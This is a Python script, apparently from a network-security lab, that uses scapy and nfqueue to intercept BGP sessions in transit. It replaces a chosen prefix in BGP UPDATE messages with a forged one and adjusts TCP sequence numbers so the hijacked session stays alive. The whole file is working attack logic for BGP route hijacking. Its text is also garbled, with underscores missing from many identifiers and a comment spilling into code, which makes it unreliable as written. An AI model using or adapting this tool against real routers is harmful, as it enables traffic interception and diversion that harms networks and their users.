import os,sys,nfqueue,socket,string
from scapy.all import *

#A function responsible of adjusting the sequence and acknowledgement numbers after a tcp packet is forged
def seq_mangle(seq, ack, sender, recer, message, or_message, forged, firstforged):
    global prev_type,newseq
    if firstforged is True: #if a packet was forged even just once start adjusting seq/ack numbers
        if message[IP].dst == recer: #if source addr is sender
            if prev_type == 'ack': #if previous message is an ack send from reciever
                seq = message[TCP].seq + len(str(or_message[TCP].payload)) #next ack is the current seq number ncreased by the length of the original message
                message[TCP].seq = ack #set as new sequence numberthe number the receiver acknowledged last time
                newseq = ack + len(str(message[TCP].payload)) #keepthe previous ack increased by the length of thecurrent message to use as next seq num in case thenext message is again from sender
            elif prev_type == 'send': #if previous message was again from sender
                message[TCP].seq = newseq #set as new sequence number the next seq number to be acked stored in newseq variable
                seq = message[TCP].seq + len(str(or_message[TCP].payload)) #next sequence number to be acked is the seqnum of the message plus message length
            print("SEQ ADJUSTED ")
            if seq > 4294967295: #if sequence number has maxed out wrap around
                seq = seq-4294967295
            prev_type = 'send' #set previous type to send
        elif message[IP].dst == sender:#if source addr is receiver store next seq and change ack to an accepted one
            ack = message[TCP].ack #store in ack the next number to be used as a sequence number
            message[TCP].ack = seq #set ack as the previous sequence number +previous message length
            prev_type = 'ack' #set previous type ack
            print("ACK ADJUSTED")
#delete checksums so they can be recalculated when the packet is send
        del message[IP].chksum
        del message[TCP].chksum
    else: #if a packet is not forged yet just keep track of the sequence and acknowledgement numbers and previous message type
        if message[IP].dst == recer:
            seq = message[TCP].seq + len(str(or_message[TCP].payload))
            newseq = seq
            prev_type = 'send'
        elif message[IP].dst == sender:
            ack = message[TCP].ack
            prev_type = 'ack'
        else:
            pass
    return message, ack, seq #return modified message and next ack and sequence numbers
    
#Function responsible in finding and changing the prefices
def bgp_edit(pkt):
    global firstfound,prev_type,port,newseq
    forged = False #initialy set forged to false
    #create an IP and a tcp packet
    ip = IP()
    tcp = TCP()
    #bgph = BGPHeader()
    #bgpu = BGPUpdate()
    temp_pkt = pkt.copy() #copy input to temp_pkt to avoid shallow copy issues
    #Copying all pkt's IP fields in ip
    ip.version = temp_pkt[IP].version
    ip.ihl = temp_pkt[IP].ihl
    ip.tos = temp_pkt[IP].tos
    ip.id = temp_pkt[IP].id
    ip.flags = temp_pkt[IP].flags
    ip.ttl = temp_pkt[IP].ttl
    ip.proto = temp_pkt[IP].proto
    ip.src = temp_pkt[IP].src
    ip.dst = temp_pkt[IP].dst
    ip.options = temp_pkt[IP].options
    #Copying all pkt's TCP fields in tcp
    tcp.sport = temp_pkt[TCP].sport
    tcp.dport = temp_pkt[TCP].dport
    tcp.seq = temp_pkt[TCP].seq
    tcp.ack = temp_pkt[TCP].ack
    tcp.dataofs = temp_pkt[TCP].dataofs
    tcp.reserved = temp_pkt[TCP].reserved
    tcp.flags = temp_pkt[TCP].flags
    tcp.window = temp_pkt[TCP].window
    tcp.urgptr = temp_pkt[TCP].urgptr
    tcp.options = temp_pkt[TCP].options
    #get the ip and tcp headers in the output message
    p=ip/tcp
    #get all the bgp messages in temp
    temp = temp_pkt[TCP].payload
    #Find how many BGPHeaders are in there using the marker to identify them
    rg = range(str(temp).count('\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'))
    #for all the bgpheaders in the message
    for j in rg:
        temp2=temp.copy() #copy next header in temp2
    # if after the header and update there are more messages delete them to keep only one header and message
        if len(str(temp2.payload.payload)) > 0:
            del temp2.payload.payload #Keep only the next Header+message and throw the rest of the payload
        #If the next message is not an update just add it in the output message
        if temp2[BGPHeader].type is not 2:
            # print temp2[BGPHeader].len
            p=p/temp2
        #if the next message is a BGP update try to find and forge the prefix
        else:
            #if the prefix we want to change exists in the bgpupdate nlri
            if temp2[BGPUpdate].nlri.count(or prefix) is not 0:
                i = temp2[BGPUpdate].nlri.index(or prefix) #find the index of the prefix in the nlri list
                temp2[BGPUpdate].nlri.pop(i) #pop(delete) the original nlri from the list
                temp2[BGPUpdate].nlri.insert(i,frg prefix) #insert the forged prefix in the same index
                print "Message Forged..."
                del temp2[BGPHeader].len #del the bgpheader len to allow scapy to recalculate it
                forged = True #set the message was forged flag
                firstfound = True #set the message was forged for the first time flag
                #When the first message is forged we keep the port used to drop all other BGP sessions between these hosts
                if temp_pkt[TCP].dport == 179:
                    port = temp_pkt[TCP].sport
                else:
                    port = temp_pkt[TCP].dport
            else: #if the prefix is not found don't change the message
                pass
            p = p/temp2 #Add the new bgpupdate in the output message
            temp = temp.payload.payload #put in temp the next
            bgpheader+update
    return forged,p

def process(i, payload):
    data = payload.get data() #get data from message payload
    pkt = IP(data) #store in pkt var the IP message with payload data
    proto = pkt.proto #store packet's protocol in proto variable
    global seq,ack, firstfound, prev_type, f1, f2,port,newseq
    forged = False
    
    if proto is 0x06: #if protocol is TCP
        destination = str(pkt[IP].dst) #put packets destination to var destination
        if pkt[TCP].dport == 179 or pkt[TCP].sport == 179:
            print("BGP message Detected")
            #If the session is reseted stop adjusting seq numbers and start rom scatch
            #if pkt[TCP].flags == 2:
            # firstfound = False
            if firstfound == False:
                print "NO CHANGES YET !!!!!!!!!!!"
            else:
                pass
            if destination == '5.6.0.1' and len(str(pkt[TCP].payload))!=0:
                #if destination is 5.6.0.1 and tcp payload size is not 0
                forged = False
                forged, frg pkt = bgp_edit(pkt) #call bgp edit to edit the packet
                if forged is True: #If the message was changed
                    message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', frg pkt, pkt, forged, firstfound)#call mangle seq on forged packet to change sequence number
                else: #if the message was not forged change only the sequence numbers
                    message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', pkt, pkt, forged, firstfound) #call mangle seq on original packet to change sequence number
            else: #if the destination was not the sender or if the message is just an ack change only the sequence number
                message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', pkt, pkt, forged, firstfound)#call mangle seq on original packet to change sequence number
            if firstfound == True: #if session established and forged throw the message
                payload.set verdict(nfqueue.NF DROP)
                #If the message is using the accepted port send its modified version
                if message[TCP].dport == port or message[TCP].sport == port:
                    send(message, verbose=0)
                else: #If the message is not using the accepted port don't send anything
                    print("\n\n YAHAHAHA YOU TRIED BUT FAILED !!!!!!!!!\n\n\n")
            else: #if session was not forged yet do nothing (the message will be forwarded automatically)
                pass
        else: #If the message is not bgp do nothing (the message will be forwarded automatically)
            pass
    else: #if the message is not tcp do nothing (the message will be forwarded automatically )
        pass

def main():
    if len(sys.argv) is not 3: #check if the script is executed with correct input and show message if not
        sys.stderr.write('Usage : '+sys.argv[0]+' <prefix to be changed> <desired prefix>\n')
        sys.exit(1)
    global or_prefix, frg_prefix, ack, seq,firstfound, prev_type, f1, f2,port,newseq
    #intializing global variables
    ack = 0
    seq = 0
    port = 0
    newseq = 0
    firstfound = False
    prev_type = 'syn'
    #create the original and forged prefix according to input
    plist = sys.argv[1].split('/',2)
    or_prefix = (int(plist[1]),plist[0])
    plist = sys.argv[2].split('/',2)
    frg_prefix = (int(plist[1]),plist[0])
    
    load contrib("bgp") #load bgp protocol in scapy
    q = nfqueue.queue() #create an nfqueue object where the iptables store the packets
    q.open() #open the queue
    q.bind(socket.AF INET) #bind queue to socket (why ?)
    q.set_callback(process) #call function (for very message)
    q.create queue(0) #create queue (initialize)
    try:
        q.try run() #try running the queue object
    except KeyboardInterrupt: #if ctrl ˆc interruption is used
        print("Exiting...") #print message
        q.unbind(socket.AF INET) #unbind socket
        q.close() #close object
        sys.exit(1) #close program
        
main()